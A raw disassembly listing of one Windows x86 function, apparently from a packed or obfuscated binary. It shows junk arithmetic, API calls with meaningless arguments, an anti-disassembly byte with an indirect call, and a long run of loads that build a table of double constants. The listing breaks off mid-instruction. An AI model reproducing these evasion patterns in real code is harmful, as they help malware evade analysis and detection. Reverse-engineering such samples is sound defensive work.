		xor	eax, dword_42FEEC
		mov	[ebp+var_10], eax
		movzx	ecx, [ebp+var_98]
		mov	edx, [ebp+pgui]
		lea	eax, [ecx+edx+2Bh]
		sub	eax, [ebp+wFirst]
		movzx	ecx, [ebp+var_98]
		add	eax, ecx
		mov	[ebp+var_11D], al
		mov	edx, [ebp+hdc]
		mov	[ebp+var_44], edx
		movzx	eax, [ebp+var_D4]
		movzx	ecx, [ebp+var_136]
		add	eax, ecx
		movzx	edx, [ebp+var_260]
		sub	eax, edx
		sub	eax, [ebp+top]
		mov	[ebp+var_260], ax
		movzx	eax, [ebp+var_118]
		mov	ecx, 11h
		sub	ecx, eax
		and	ecx, [ebp+var_A4]
		mov	[ebp+var_A4], ecx
		mov	dx, word ptr y
		mov	word ptr Wow64Process, dx
		movzx	eax, [ebp+var_22]
		sub	eax, hProcess
		sub	eax, Wow64Process
		movzx	ecx, [ebp+var_22]
		add	ecx, 7
		and	eax, ecx
		mov	[ebp+var_21], al
		mov	[ebp+var_204], 4Eh
		mov	edx, hdc
		push	edx		; hdc
		call	ds:GetArcDirection
		sub	eax, Wow64Process
		sub	eax, Wow64Process
		sub	eax, 0Ch
		mov	[ebp+var_1B0], ax
		mov	eax, [ebp+var_A4]
		xor	eax, 64h
		mov	[ebp+var_1D0], eax
		mov	ecx, dword_42C024
		xor	ecx, 53h
		mov	hProcess, ecx
		mov	edx, [ebp+var_1D0]
		mov	eax, [ebp+var_A4]
		lea	ecx, [eax+edx-4Ch]
		movzx	edx, [ebp+var_134]
		sub	ecx, edx
		mov	[ebp+var_134], cx
		movzx	eax, [ebp+var_E8]
		add	eax, hdc
		mov	ecx, hdc
		lea	edx, [ecx+eax+4Bh]
		mov	[ebp+var_260], dx
		mov	eax, [ebp+var_A0]
		add	eax, 1
		sub	eax, dword_42FEEC
		mov	[ebp+var_C8], eax
		mov	ecx, [ebp+var_FC]
		sub	ecx, [ebp+pgui]
		movzx	edx, [ebp+var_135]
		add	ecx, edx
		mov	[ebp+var_D0], ecx
		movzx	eax, [ebp+var_C0]
		add	eax, [ebp+wFirst]
		mov	ecx, [ebp+top]
		lea	edx, [eax+ecx+4Bh]
		mov	[ebp+var_98], dx
		movzx	eax, [ebp+var_135]
		mov	[ebp+pvIn], eax
		mov	ecx, [ebp+var_AC]
		add	ecx, 61h
		mov	edx, 26h
		sub	edx, [ebp+top]
		and	edx, [ebp+hemf]
		xor	ecx, edx
		mov	[ebp+var_1D1], cl
		mov	eax, [ebp+var_AC]
		mov	[ebp+var_249C],	eax
		cmp	[ebp+var_249C],	0
		jz	short loc_40A8BA
		cmp	[ebp+var_249C],	1
		jz	short loc_40A90C
		cmp	[ebp+var_249C],	2
		jz	loc_40A9FA
		jmp	loc_40AA41
; ---------------------------------------------------------------------------

loc_40A8BA:				; CODE XREF: sub_409DF0+AADj
		movzx	ecx, [ebp+var_250]
		sub	ecx, 55h
		movzx	edx, [ebp+var_136]
		sub	ecx, edx
		mov	[ebp+var_136], cl
		movzx	eax, [ebp+var_12C]
		sub	eax, 5Ah
		mov	[ebp+var_12C], ax
		mov	ecx, [ebp+hdc]
		sub	ecx, 98h
		xor	ecx, [ebp+pgui]
		mov	[ebp+var_11C], cx
		movzx	edx, [ebp+var_22]
		mov	dword_42C048, edx
		jmp	loc_40AA5A
; ---------------------------------------------------------------------------

loc_40A90C:				; CODE XREF: sub_409DF0+AB6j
		mov	dword_42C058, 2
		cmp	[ebp+hemf], 21h
		jnz	short loc_40A94A
		mov	eax, [ebp+var_FC]
		mov	[ebp+hemf], eax
		movzx	ecx, [ebp+var_105]
		add	ecx, [ebp+pvOut]
		mov	edx, [ebp+var_AC]
		lea	eax, [ecx+edx+38h]
		sub	eax, [ebp+var_FC]
		mov	[ebp+var_11E], al
		jmp	short loc_40A97D
; ---------------------------------------------------------------------------

loc_40A94A:				; CODE XREF: sub_409DF0+B2Aj
		mov	esi, 5Ah
		sub	esi, [ebp+hemf]
		mov	ecx, [ebp+var_AC]
		push	ecx
		mov	edx, [ebp+top]
		push	edx
		call	sub_4100E0
		add	esp, 8
		sub	esi, eax
		mov	[ebp+var_B8], esi
		movzx	eax, [ebp+var_1C4]
		mov	[ebp+pvIn], eax

loc_40A97D:				; CODE XREF: sub_409DF0+B58j
		mov	ecx, 0FFFFFFE8h
		sub	ecx, [ebp+pvIn]
		sub	ecx, 52h
		mov	[ebp+var_F0], cx
		cmp	[ebp+var_130], 4Ch
		jnb	short loc_40A9C2
		mov	edx, [ebp+wFirst]
		sub	edx, 2
		sub	edx, [ebp+pvOut]
		add	edx, [ebp+hemf]
		mov	[ebp+var_21], dl
		movzx	eax, [ebp+var_EC]
		add	eax, 1
		mov	[ebp+var_D0], eax
		jmp	short loc_40A9F8
; ---------------------------------------------------------------------------

loc_40A9C2:				; CODE XREF: sub_409DF0+BA9j
		mov	ecx, [ebp+var_114]
		mov	edx, [ebp+pvOut]
		lea	eax, [edx+ecx+28h]
		mov	[ebp+var_E4], eax
		movzx	ecx, [ebp+var_20]
		movzx	edx, [ebp+var_98]
		mov	eax, 3Ch
		sub	eax, edx
		sub	eax, [ebp+wFirst]
		xor	ecx, eax
		or	ecx, 11h
		mov	[ebp+var_5], cl

loc_40A9F8:				; CODE XREF: sub_409DF0+BD0j
		jmp	short loc_40AA5A
; ---------------------------------------------------------------------------

loc_40A9FA:				; CODE XREF: sub_409DF0+ABFj
		mov	ecx, dword_42C048
		xor	ecx, 27h
		mov	dword_42C048, ecx
		movzx	edx, [ebp+var_20]
		cmp	edx, 3Bh
		jge	short loc_40AA20
		mov	eax, [ebp+pvIn]
		sub	eax, 38h
		mov	[ebp+hemf], eax
		jmp	short loc_40AA29
; ---------------------------------------------------------------------------

loc_40AA20:				; CODE XREF: sub_409DF0+C20j
		mov	ecx, [ebp+hemf]
		mov	[ebp+pgui], ecx

loc_40AA29:				; CODE XREF: sub_409DF0+C2Ej
		movzx	edx, [ebp+var_20]
		movzx	eax, [ebp+var_F0]
		lea	ecx, [eax+edx+52h]
		mov	[ebp+var_F0], cx
		jmp	short loc_40AA5A
; ---------------------------------------------------------------------------

loc_40AA41:				; CODE XREF: sub_409DF0+AC5j
		mov	edx, [ebp+wFirst]
		add	edx, 50h
		sub	edx, [ebp+pvOut]
		add	edx, 21h
		mov	[ebp+var_D4], dx

loc_40AA5A:				; CODE XREF: sub_409DF0+B17j
					; sub_409DF0:loc_40A9F8j ...
		movzx	eax, [ebp+var_98]
		mov	[ebp+var_FC], eax
		mov	[ebp+var_204], 36h
		mov	ecx, [ebp+hdc]
		add	ecx, 4Dh
		xor	ecx, 80h
		mov	[ebp+var_264], cx
		mov	[ebp+var_2484],	0
		jmp	short loc_40AAA2
; ---------------------------------------------------------------------------

loc_40AA93:				; CODE XREF: sub_409DF0+D8Cj
		mov	edx, [ebp+var_2484]
		add	edx, 1
		mov	[ebp+var_2484],	edx

loc_40AAA2:				; CODE XREF: sub_409DF0+CA1j
		cmp	[ebp+var_2484],	5
		jge	loc_40AB81
		mov	eax, [ebp+var_FC]
		mov	[ebp+pvOut], eax
		mov	ecx, [ebp+pvIn]
		mov	[ebp+var_148], ecx
		mov	edx, [ebp+var_AC]
		sub	edx, 2Ah
		movzx	eax, [ebp+var_99]
		sub	edx, eax
		and	edx, 6
		mov	[ebp+var_105], dl
		movzx	ecx, [ebp+var_1A8]
		sub	ecx, 2Bh
		mov	[ebp+var_1A8], cx
		mov	edx, [ebp+top]
		mov	[ebp+var_1FC], edx
		mov	eax, [ebp+pgui]
		add	eax, 3Bh
		mov	[ebp+pvIn], eax
		movzx	ecx, [ebp+var_D5]
		mov	[ebp+pgui], ecx
		mov	edx, [ebp+var_AC]
		push	edx
		mov	eax, [ebp+pgui]
		push	eax
		mov	ecx, [ebp+top]
		push	ecx
		mov	edx, [ebp+hemf]
		push	edx
		mov	eax, [ebp+var_FC]
		push	eax
		call	sub_4092F0
		add	esp, 14h
		add	eax, [ebp+var_114]
		sub	eax, [ebp+var_AC]
		and	eax, [ebp+var_258]
		mov	[ebp+var_C0], ax
		movzx	ecx, [ebp+var_99]
		xor	ecx, 2Ah
		movzx	edx, [ebp+var_11E]
		add	edx, [ebp+var_1D0]
		xor	ecx, edx
		mov	[ebp+var_1B0], cx
		jmp	loc_40AA93
; ---------------------------------------------------------------------------

loc_40AB81:				; CODE XREF: sub_409DF0+CB9j
		mov	eax, [ebp+var_AC]
		mov	[ebp+hdc], eax
		movzx	ecx, [ebp+var_264]
		add	ecx, [ebp+top]
		movzx	edx, [ebp+var_136]
		add	ecx, edx
		mov	[ebp+var_1C0], ecx
		mov	eax, [ebp+hdc]
		sub	eax, 5
		mov	[ebp+var_E4], eax
		mov	ecx, [ebp+pgui]
		push	ecx		; pgui
		mov	edx, [ebp+pvIn]
		push	edx		; idThread
		call	ds:GetGUIThreadInfo
		mov	ecx, [ebp+hdc]
		sub	ecx, eax
		mov	edx, [ebp+top]
		lea	eax, [ecx+edx+54h]
		sub	eax, [ebp+var_BC]
		mov	[ebp+var_11E], al
		mov	ecx, 22h
		mov	word ptr [ebp+hemf], cx
		mov	edx, [ebp+pvIn]
		push	edx		; hcs
		push	47h		; hdc
		call	ds:SetColorSpace
		mov	esi, eax
		add	esi, [ebp+var_AC]
		mov	eax, [ebp+var_FC]
		push	eax
		mov	ecx, [ebp+pvIn]
		push	ecx
		mov	edx, [ebp+var_AC]
		push	edx
		call	sub_402000
		add	esp, 0Ch
		add	esi, eax
		mov	[ebp+var_130], esi
		mov	eax, [ebp+var_10]
		xor	eax, [ebp+var_C8]
		mov	[ebp+var_10], eax
		movzx	ecx, [ebp+var_136]
		mov	edx, [ebp+pvOut]
		sub	edx, ecx
		mov	[ebp+hemf], edx
		mov	[ebp+pgui], 4Ah
		mov	eax, [ebp+hemf]
		mov	[ebp+var_24A0],	eax
		cmp	[ebp+var_24A0],	0
		jz	short loc_40AC74
		cmp	[ebp+var_24A0],	1
		jz	short loc_40AC8C
		jmp	short loc_40ACD7
; ---------------------------------------------------------------------------

loc_40AC74:				; CODE XREF: sub_409DF0+E77j
		movzx	ecx, [ebp+var_C0]
		add	ecx, 48h
		or	ecx, dword_42C058
		mov	dword_42C058, ecx
		jmp	short loc_40ACF0
; ---------------------------------------------------------------------------

loc_40AC8C:				; CODE XREF: sub_409DF0+E80j
		cmp	[ebp+var_FC], 46h
		jle	short loc_40ACD5
		mov	edx, 33h
		sub	edx, [ebp+var_AC]
		movzx	eax, [ebp+var_7]
		add	eax, 40h
		or	edx, eax
		mov	[ebp+var_11C], dx
		movzx	ecx, [ebp+var_D4]
		and	ecx, 3Fh
		movzx	edx, [ebp+var_F0]
		xor	ecx, edx
		movzx	eax, [ebp+var_260]
		add	eax, 57h
		xor	ecx, eax
		mov	[ebp+var_11E], cl

loc_40ACD5:				; CODE XREF: sub_409DF0+EA3j
		jmp	short loc_40ACF0
; ---------------------------------------------------------------------------

loc_40ACD7:				; CODE XREF: sub_409DF0+E82j
		movzx	ecx, [ebp+var_99]
		add	ecx, 1Eh
		and	ecx, 1Fh
		or	ecx, [ebp+var_AC]
		mov	[ebp+var_1D1], cl

loc_40ACF0:				; CODE XREF: sub_409DF0+E9Aj
					; sub_409DF0:loc_40ACD5j
		mov	edx, [ebp+hdc]
		mov	[ebp+var_88], edx
		mov	eax, [ebp+var_1D0]
		add	eax, 1Dh
		mov	[ebp+var_A4], eax
		mov	[ebp+var_2488],	0
		jmp	short loc_40AD26
; ---------------------------------------------------------------------------

loc_40AD17:				; CODE XREF: sub_409DF0+1063j
		mov	ecx, [ebp+var_2488]
		add	ecx, 1
		mov	[ebp+var_2488],	ecx

loc_40AD26:				; CODE XREF: sub_409DF0+F25j
		cmp	[ebp+var_2488],	0Fh
		jge	loc_40AE58
		movzx	edx, [ebp+var_1B0]
		cmp	edx, 42h
		jnz	short loc_40AD76
		mov	eax, 4Ah
		sub	eax, [ebp+var_104]
		add	eax, 56h
		xor	eax, hdc
		mov	[ebp+var_260], ax
		mov	ecx, 1
		sub	ecx, lpExitCode
		add	ecx, 37h
		xor	ecx, y
		mov	[ebp+var_269], cl
		jmp	short loc_40ADA4
; ---------------------------------------------------------------------------

loc_40AD76:				; CODE XREF: sub_409DF0+F4Dj
		mov	edx, 5Fh
		sub	edx, dword_42C024
		mov	hdc, edx
		mov	eax, y
		sub	eax, 1Dh
		sub	eax, hdc
		add	eax, 2Dh
		and	eax, Wow64Process
		mov	[ebp+var_11D], al

loc_40ADA4:				; CODE XREF: sub_409DF0+F84j
		movzx	ecx, [ebp+var_11E]
		mov	edx, 0FFFFFFC6h
		sub	edx, ecx
		or	edx, 34h
		mov	[ebp+var_20], dx
		movzx	eax, [ebp+var_118]
		mov	ecx, lpExitCode
		lea	esi, [ecx+eax-51h]
		mov	edx, hProcess
		push	edx
		mov	eax, hProcess
		push	eax
		mov	ecx, hProcess
		push	ecx
		mov	edx, dword_42C024
		push	edx
		mov	eax, dword_42C024
		push	eax
		call	sub_407820
		add	esp, 14h
		sub	esi, eax
		mov	[ebp+var_98], si
		movzx	ecx, [ebp+var_6]
		movzx	edx, [ebp+var_1C]
		lea	eax, [ecx+edx+5Eh]
		movzx	ecx, [ebp+var_5]
		sub	eax, ecx
		mov	[ebp+var_1B0], ax
		mov	edx, Wow64Process
		add	edx, 28h
		mov	lpExitCode, edx
		mov	eax, hdc
		add	eax, 0Dh
		sub	eax, [ebp+var_18]
		mov	[ebp+var_1C4], ax
		movzx	ecx, [ebp+var_5]
		mov	edx, dword_42C024
		sub	edx, ecx
		add	edx, [ebp+var_4]
		movzx	eax, [ebp+var_1D1]
		lea	ecx, [edx+eax-2Dh]
		mov	[ebp+var_7], cl
		jmp	loc_40AD17
; ---------------------------------------------------------------------------

loc_40AE58:				; CODE XREF: sub_409DF0+F3Dj
		movzx	edx, [ebp+var_1B0]
		mov	eax, dword_42C024
		sub	eax, edx
		movzx	ecx, [ebp+var_1A4]
		sub	eax, ecx
		movzx	edx, [ebp+var_98]
		and	edx, eax
		mov	[ebp+var_98], dx
		mov	ax, word ptr y
		mov	word ptr y, ax
		mov	[ebp+var_234], 1Fh
		mov	ecx, [ebp+pvOut]
		push	ecx		; color
		push	4Dh		; hdc
		call	ds:SetDCPenColor
		add	eax, [ebp+var_FC]
		mov	[ebp+hdc], eax
		mov	esi, [ebp+var_AC]
		sub	esi, [ebp+hemf]
		mov	edx, [ebp+var_FC]
		push	edx
		mov	eax, [ebp+hdc]
		push	eax
		mov	ecx, [ebp+wFirst]
		push	ecx
		call	sub_402000
		add	esp, 0Ch
		lea	edx, [esi+eax+1Ch]
		mov	[ebp+var_260], dx
		mov	eax, [ebp+hdc]
		push	eax		; ppfd
		push	1Ah		; cbBuffer
		mov	ecx, [ebp+hemf]
		push	ecx		; hemf
		call	ds:GetEnhMetaFilePixelFormat
		sub	eax, 2Bh
		sub	eax, [ebp+var_94]
		sub	eax, [ebp+hdc]
		add	eax, 18h
		mov	[ebp+var_1C5], al
		movzx	edx, byte ptr [ebp+hemf]
		mov	[ebp+hemf], edx
		mov	eax, [ebp+var_AC]
		mov	[ebp+var_18C], eax
		mov	ecx, [ebp+pvOut]
		push	ecx
		mov	edx, [ebp+pvOut]
		push	edx
		mov	eax, [ebp+hemf]
		push	eax
		call	sub_402000
		add	esp, 0Ch
		xor	eax, 10h
		mov	[ebp+var_F0], ax
		mov	ecx, [ebp+hemf]
		add	ecx, 26h
		and	ecx, 18h
		xor	ecx, [ebp+var_FC]
		mov	[ebp+var_136], cl
		movzx	edx, [ebp+var_E8]
		mov	[ebp+hdc], edx
		mov	eax, [ebp+hdc]
		push	eax		; lpCommTimeouts
		push	3Fh		; hFile
		call	ds:GetCommTimeouts
		mov	[ebp+top], eax
		mov	[ebp+var_38], 41h
		movzx	ecx, [ebp+var_1B0]
		mov	edx, 23h
		sub	edx, ecx
		movzx	eax, [ebp+var_F1]
		sub	edx, eax
		mov	[ebp+var_99], dl
		mov	[ebp+var_248C],	0
		jmp	short loc_40AFB9
; ---------------------------------------------------------------------------

loc_40AFAA:				; CODE XREF: sub_409DF0+1251j
		mov	ecx, [ebp+var_248C]
		add	ecx, 1
		mov	[ebp+var_248C],	ecx

loc_40AFB9:				; CODE XREF: sub_409DF0+11B8j
		cmp	[ebp+var_248C],	6
		jge	loc_40B046
		mov	[ebp+var_5C], 3
		movzx	edx, [ebp+var_1B0]
		movzx	eax, [ebp+var_136]
		movzx	ecx, [ebp+var_7]
		add	eax, ecx
		xor	edx, eax
		mov	[ebp+var_18], edx
		mov	edx, Wow64Process
		sub	edx, 37h
		sub	edx, y
		mov	[ebp+var_E4], edx
		mov	hdc, 57h
		mov	eax, [ebp+var_A4]
		sub	eax, 4Ch
		sub	eax, hdc
		and	eax, 61h
		mov	[ebp+var_F0], ax
		mov	ecx, dword_42C064
		mov	hdc, ecx
		mov	edx, hProcess
		mov	[ebp+var_78], edx
		mov	eax, lpExitCode
		add	eax, 27h
		mov	[ebp+var_104], eax
		jmp	loc_40AFAA
; ---------------------------------------------------------------------------

loc_40B046:				; CODE XREF: sub_409DF0+11D0j
		mov	ecx, hProcess
		sub	ecx, 36h
		xor	ecx, 3Bh
		movzx	edx, [ebp+var_1C4]
		and	edx, ecx
		mov	[ebp+var_1C4], dx
		movzx	eax, [ebp+var_F1]
		add	eax, y
		add	eax, dword_42C024
		mov	[ebp+var_94], eax
		mov	ecx, [ebp+var_A0]
		mov	dl, byte_42C068[ecx*4]
		mov	[ebp+var_125], dl
		mov	edx, [ebp+var_247C]
		mov	al, 0FFh
		cmp	dl, al
		jnz	short loc_40B0A1
		test	edx, esi
		jmp	short loc_40B0AE
; ---------------------------------------------------------------------------
		and	eax, 3

loc_40B0A1:				; CODE XREF: sub_409DF0+12A8j
		mov	al, 33h
		db	3Eh
		mov	eax, [esi+40h]
		call	eax
		jmp	loc_40E5FA
; ---------------------------------------------------------------------------

loc_40B0AE:				; CODE XREF: sub_409DF0+12ACj
		sub	esp, 8
		fld1
		fstp	[esp+24C4h+var_24C4] ; double
		sub	esp, 8
		fld	ds:dbl_4247C0
		fstp	[esp+24CCh+var_24CC] ; double
		call	_pow
		add	esp, 10h
		fsub	ds:dbl_4247C0
		sub	esp, 8
		fld1
		fstp	[esp+24C4h+var_24C4] ; double
		fstp	[ebp+var_24A8]
		call	_log
		add	esp, 8
		fadd	[ebp+var_24A8]
		sub	esp, 8
		fldz
		fstp	[esp+24C4h+var_24C4] ; double
		fstp	[ebp+var_24B0]
		call	_exp
		add	esp, 8
		fadd	[ebp+var_24B0]
		fsub	ds:dbl_4246C8
		movsx	eax, [ebp+var_125]
		mov	[ebp+var_24B4],	eax
		fild	[ebp+var_24B4]
		faddp	st(1), st
		fiadd	[ebp+var_10]
		call	__ftol2_sse
		mov	[ebp+var_23], al
		movzx	ecx, [ebp+var_1D1]
		sub	ecx, [ebp+var_FC]
		sub	ecx, [ebp+hemf]
		mov	[ebp+var_1D0], ecx
		mov	dx, word ptr [ebp+wFirst]
		mov	word ptr [ebp+hemf], dx
		mov	eax, [ebp+pgui]
		mov	[ebp+var_174], eax
		movzx	ebx, [ebp+var_F0]
		add	ebx, 15h
		mov	ecx, [ebp+top]
		push	ecx		; bottom
		push	25h		; right
		mov	edx, [ebp+top]
		push	edx		; top
		push	40h		; left
		mov	eax, [ebp+var_AC]
		push	eax		; hdc
		call	ds:Ellipse
		add	eax, 0Bh
		xor	ebx, eax
		mov	[ebp+var_7], bl
		mov	ecx, 11h
		sub	ecx, [ebp+var_BC]
		add	ecx, 4Ch
		mov	[ebp+var_A4], ecx
		movzx	edx, [ebp+var_105]
		add	edx, 24h
		mov	eax, [ebp+hdc]
		add	eax, 38h
		xor	edx, eax
		mov	[ebp+var_22], dl
		fld	ds:dbl_4248B0
		fstp	[ebp+var_2478]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_2470]
		fld	ds:dbl_424B88
		fstp	[ebp+var_2468]
		fld	ds:dbl_424900
		fstp	[ebp+var_2460]
		fld	ds:dbl_424A40
		fstp	[ebp+var_2458]
		fld	ds:dbl_424968
		fstp	[ebp+var_2450]
		fld	ds:dbl_424890
		fstp	[ebp+var_2448]
		fld	ds:dbl_424578
		fstp	[ebp+var_2440]
		fld	ds:dbl_424B18
		fstp	[ebp+var_2438]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_2430]
		fld	ds:dbl_424680
		fstp	[ebp+var_2428]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_2420]
		fld	ds:dbl_424A08
		fstp	[ebp+var_2418]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_2410]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_2408]
		fld	ds:dbl_424760
		fstp	[ebp+var_2400]
		fld	ds:dbl_424AB8
		fstp	[ebp+var_23F8]
		fld	ds:dbl_424680
		fstp	[ebp+var_23F0]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_23E8]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_23E0]
		fld	ds:dbl_424808
		fstp	[ebp+var_23D8]
		fld	ds:dbl_424850
		fstp	[ebp+var_23D0]
		fld	ds:dbl_4249B8
		fstp	[ebp+var_23C8]
		fld	ds:dbl_4247A8
		fstp	[ebp+var_23C0]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_23B8]
		fld	ds:dbl_424918
		fstp	[ebp+var_23B0]
		fld	ds:dbl_424900
		fstp	[ebp+var_23A8]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_23A0]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_2398]
		fld	ds:dbl_424590
		fstp	[ebp+var_2390]
		fld	ds:dbl_424518
		fstp	[ebp+var_2388]
		fld	ds:dbl_4244B8
		fstp	[ebp+var_2380]
		fld	ds:dbl_424698
		fstp	[ebp+var_2378]
		fld	ds:dbl_424850
		fstp	[ebp+var_2370]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_2368]
		fld	ds:dbl_424B18
		fstp	[ebp+var_2360]
		fld	ds:dbl_424B28
		fstp	[ebp+var_2358]
		fld	ds:dbl_4247D0
		fstp	[ebp+var_2350]
		fld	ds:dbl_424B68
		fstp	[ebp+var_2348]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_2340]
		fld	ds:dbl_424A88
		fstp	[ebp+var_2338]
		fld	ds:dbl_424800
		fstp	[ebp+var_2330]
		fld	ds:dbl_4247A8
		fstp	[ebp+var_2328]
		fld	ds:dbl_4245D0
		fstp	[ebp+var_2320]
		fld	ds:dbl_4247F8
		fstp	[ebp+var_2318]
		fld	ds:dbl_424490
		fstp	[ebp+var_2310]
		fld	ds:dbl_424638
		fstp	[ebp+var_2308]
		fld	ds:dbl_424AD8
		fstp	[ebp+var_2300]
		fld	ds:dbl_424720
		fstp	[ebp+var_22F8]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_22F0]
		fld	ds:dbl_424748
		fstp	[ebp+var_22E8]
		fld	ds:dbl_424730
		fstp	[ebp+var_22E0]
		fld	ds:dbl_424670
		fstp	[ebp+var_22D8]
		fld	ds:dbl_424448
		fstp	[ebp+var_22D0]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_22C8]
		fld	ds:dbl_4248C8
		fstp	[ebp+var_22C0]
		fld	ds:dbl_424620
		fstp	[ebp+var_22B8]
		fld	ds:dbl_424988
		fstp	[ebp+var_22B0]
		fld	ds:dbl_424670
		fstp	[ebp+var_22A8]
		fld	ds:dbl_424508
		fstp	[ebp+var_22A0]
		fld	ds:dbl_424998
		fstp	[ebp+var_2298]
		fld	ds:dbl_424B90
		fstp	[ebp+var_2290]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_2288]
		fld	ds:dbl_424520
		fstp	[ebp+var_2280]
		fld	ds:dbl_4249B8
		fstp	[ebp+var_2278]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_2270]
		fld	ds:dbl_4246E8
		fstp	[ebp+var_2268]
		fld	ds:dbl_424940
		fstp	[ebp+var_2260]
		fld	ds:dbl_424720
		fstp	[ebp+var_2258]
		fld	ds:dbl_424AB8
		fstp	[ebp+var_2250]
		fld	ds:dbl_424480
		fstp	[ebp+var_2248]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_2240]
		fld	ds:dbl_424A28
		fstp	[ebp+var_2238]
		fld	ds:dbl_424AA0
		fstp	[ebp+var_2230]
		fld	ds:dbl_4245C8
		fstp	[ebp+var_2228]
		fld	ds:dbl_424550
		fstp	[ebp+var_2220]
		fld	ds:dbl_4245C8
		fstp	[ebp+var_2218]
		fld	ds:dbl_424670
		fstp	[ebp+var_2210]
		fld	ds:dbl_424790
		fstp	[ebp+var_2208]
		fld	ds:dbl_424898
		fstp	[ebp+var_2200]
		fld	ds:dbl_424850
		fstp	[ebp+var_21F8]
		fld	ds:dbl_424B10
		fstp	[ebp+var_21F0]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_21E8]
		fld	ds:dbl_424748
		fstp	[ebp+var_21E0]
		fld	ds:dbl_424958
		fstp	[ebp+var_21D8]
		fld	ds:dbl_424670
		fstp	[ebp+var_21D0]
		fld	ds:dbl_424908
		fstp	[ebp+var_21C8]
		fld	ds:dbl_424618
		fstp	[ebp+var_21C0]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_21B8]
		fld	ds:dbl_424828
		fstp	[ebp+var_21B0]
		fld	ds:dbl_4246D8
		fstp	[ebp+var_21A8]
		fld	ds:dbl_424598
		fstp	[ebp+var_21A0]
		fld	ds:dbl_424820
		fstp	[ebp+var_2198]
		fld	ds:dbl_424918
		fstp	[ebp+var_2190]
		fld	ds:dbl_424488
		fstp	[ebp+var_2188]
		fld	ds:dbl_4245F8
		fstp	[ebp+var_2180]
		fld	ds:dbl_424550
		fstp	[ebp+var_2178]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_2170]
		fld	ds:dbl_424590
		fstp	[ebp+var_2168]
		fld	ds:dbl_424480
		fstp	[ebp+var_2160]
		fld	ds:dbl_424438
		fstp	[ebp+var_2158]
		fld	ds:dbl_424640
		fstp	[ebp+var_2150]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_2148]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_2140]
		fld	ds:dbl_424608
		fstp	[ebp+var_2138]
		fld	ds:dbl_424740
		fstp	[ebp+var_2130]
		fld	ds:dbl_424950
		fstp	[ebp+var_2128]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_2120]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_2118]
		fld	ds:dbl_424A98
		fstp	[ebp+var_2110]
		fld	ds:dbl_424680
		fstp	[ebp+var_2108]
		fld	ds:dbl_424958
		fstp	[ebp+var_2100]
		fld	ds:dbl_4244C0
		fstp	[ebp+var_20F8]
		fld	ds:dbl_424660
		fstp	[ebp+var_20F0]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_20E8]
		fld	ds:dbl_424B68
		fstp	[ebp+var_20E0]
		fld	ds:dbl_424890
		fstp	[ebp+var_20D8]
		fld	ds:dbl_424B00
		fstp	[ebp+var_20D0]
		fld	ds:dbl_4247C0
		fstp	[ebp+var_20C8]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_20C0]
		fld	ds:dbl_424928
		fstp	[ebp+var_20B8]
		fld	ds:dbl_424878
		fstp	[ebp+var_20B0]
		fld	ds:dbl_4248E8
		fstp	[ebp+var_20A8]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_20A0]
		fld	ds:dbl_424860
		fstp	[ebp+var_2098]
		fld	ds:dbl_424708
		fstp	[ebp+var_2090]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_2088]
		fld	ds:dbl_4246B0
		fstp	[ebp+var_2080]
		fld	ds:dbl_424830
		fstp	[ebp+var_2078]
		fld	ds:dbl_424608
		fstp	[ebp+var_2070]
		fld	ds:dbl_424C00
		fstp	[ebp+var_2068]
		fld	ds:dbl_4247A8
		fstp	[ebp+var_2060]
		fld	ds:dbl_424A08
		fstp	[ebp+var_2058]
		fld	ds:dbl_424990
		fstp	[ebp+var_2050]
		fld	ds:dbl_424B28
		fstp	[ebp+var_2048]
		fld	ds:dbl_4245C0
		fstp	[ebp+var_2040]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_2038]
		fld	ds:dbl_424B30
		fstp	[ebp+var_2030]
		fld	ds:dbl_424580
		fstp	[ebp+var_2028]
		fld	ds:dbl_424670
		fstp	[ebp+var_2020]
		fld	ds:dbl_424690
		fstp	[ebp+var_2018]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_2010]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_2008]
		fld	ds:dbl_424710
		fstp	[ebp+var_2000]
		fld	ds:dbl_424718
		fstp	[ebp+var_1FF8]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_1FF0]
		fld	ds:dbl_424668
		fstp	[ebp+var_1FE8]
		fld	ds:dbl_424940
		fstp	[ebp+var_1FE0]
		fld	ds:dbl_424B08
		fstp	[ebp+var_1FD8]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_1FD0]
		fld	ds:dbl_424858
		fstp	[ebp+var_1FC8]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_1FC0]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_1FB8]
		fld	ds:dbl_424778
		fstp	[ebp+var_1FB0]
		fld	ds:dbl_424588
		fstp	[ebp+var_1FA8]
		fld	ds:dbl_424680
		fstp	[ebp+var_1FA0]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_1F98]
		fld	ds:dbl_424768
		fstp	[ebp+var_1F90]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_1F88]
		fld	ds:dbl_424C28
		fstp	[ebp+var_1F80]
		fld	ds:dbl_424840
